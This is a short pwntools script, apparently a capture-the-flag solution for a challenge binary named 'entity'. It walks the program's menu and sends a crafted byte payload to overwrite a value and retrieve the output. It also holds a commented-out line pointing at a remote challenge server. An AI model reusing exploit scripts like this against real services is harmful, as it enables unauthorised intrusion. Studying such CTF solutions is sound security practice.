from pwn import *

r = process("./entity")
#r = remote('206.189.117.93', 31126)

payload = b'\xC9\x07\xCC\x00\x00\x00\x00\x00'

r.recvuntil(b'>> ')
r.sendline(b'T')
r.recvuntil(b'>> ')
r.sendline(b'S')
r.recvuntil(b'>> ')
r.sendline(payload)
r.recvuntil(b'>> ')
r.sendline(b'C')
data = r.recv()
print(data)
